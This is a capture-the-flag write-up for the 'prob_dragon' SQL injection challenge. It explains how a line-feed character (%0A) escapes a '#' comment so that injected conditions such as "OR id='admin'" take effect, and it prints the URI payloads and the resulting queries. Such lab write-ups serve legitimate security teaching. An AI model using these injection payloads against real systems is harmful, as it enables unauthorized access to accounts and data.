---
custom_edit_url: null
sidebar_position: 20
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/468d8f1f-52df-469c-b3d7-ab9fe0a496f0)

We are provided with the SQL query:

```sql
SELECT id FROM prob_dragon WHERE id='guest'# AND pw='{$_GET[pw]}'
```

As we can see, the code comments out the part where our input is inserted within the query.

We can get around this by using the Line Feed (`%0A`) character, which causes the rest of the SQL query to be pushed onto the next line. The Hash (`#`) only only comments out the query on the same line.

If we provide the following URI parameter:

```
?pw='%0A OR id='admin' 
```

The resultant query becomes:

```sql
SELECT id FROM prob_dragon WHERE id='guest'# AND pw=''
OR id='admin' 
```

![2](https://github.com/Kunull/Write-ups/assets/110326359/92b67e86-55ba-43de-9032-fa1b61ee5fa7)

As we can see, the `OR id='admin'` part is not commented out, just as expected.

Since we want the second part of the query to be executed, we have to make the first part return `False`. We can do so by providing the following URI parameter:

```
?pw='%0A AND pw='1337' OR id='admin' 
```

The resultant query becomes:

```sql
SELECT id FROM prob_dragon WHERE id='guest'# AND pw=''
AND pw='1337' OR id='admin' 
```

Since there is no `id='guest'` with `pw='1337'`, the first part will return `False`.

![3](https://github.com/Kunull/Write-ups/assets/110326359/a2f5e482-30c0-4e1a-96a7-ce87efaabced)
